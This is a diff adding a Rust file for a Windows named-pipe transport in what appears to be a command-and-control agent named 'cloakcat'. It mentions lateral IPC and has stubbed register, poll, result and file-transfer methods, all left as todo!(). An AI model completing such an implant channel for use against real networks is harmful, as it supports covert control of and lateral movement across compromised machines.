@@ -1,0 +1,55 @@
+//! Named-pipe transport for parent↔child IPC on Windows.
+
+#![cfg(target_os = "windows")]
+
+use anyhow::Result;
+use cloakcat_protocol::{Command, FileChunk, RegisterReq, RegisterResp, ResultReq};
+
+use super::Transport;
+use crate::io::win_pipe::PipeHandle;
+use crate::utils::rand_hex;
+
+/// SMB-style named-pipe transport for local or lateral IPC.
+pub struct PipeTransport {
+    pipe_name: String,
+    is_server: bool,
+    handle: Option<PipeHandle>,
+}
+
+impl PipeTransport {
+    /// Create a new pipe transport.
+    ///
+    /// If `pipe_name` is `None`, a random name is generated
+    /// (e.g. `\\.\pipe\ipc_a1b2c3d4e5f6g7h8`).
+    pub fn new(pipe_name: Option<String>, is_server: bool) -> Self {
+        let pipe_name = pipe_name
+            .unwrap_or_else(|| format!("\\\\.\\pipe\\ipc_{}", rand_hex(8)));
+        Self {
+            pipe_name,
+            is_server,
+            handle: None,
+        }
+    }
+}
+
+impl Transport for PipeTransport {
+    async fn register(&self, _url: &str, _token: &str, _req: &RegisterReq) -> Result<RegisterResp> {
+        todo!()
+    }
+
+    async fn poll(&self, _url: &str, _token: &str) -> Result<(u16, String)> {
+        todo!()
+    }
+
+    async fn send_result(&self, _url: &str, _token: &str, _req: &ResultReq) -> Result<()> {
+        todo!()
+    }
+
+    async fn fetch_upload_file(&self, _url: &str, _token: &str) -> Result<Vec<u8>> {
+        todo!()
+    }
+
+    async fn send_download_chunk(&self, _url: &str, _token: &str, _chunk: &FileChunk) -> Result<()> {
+        todo!()
+    }
+}
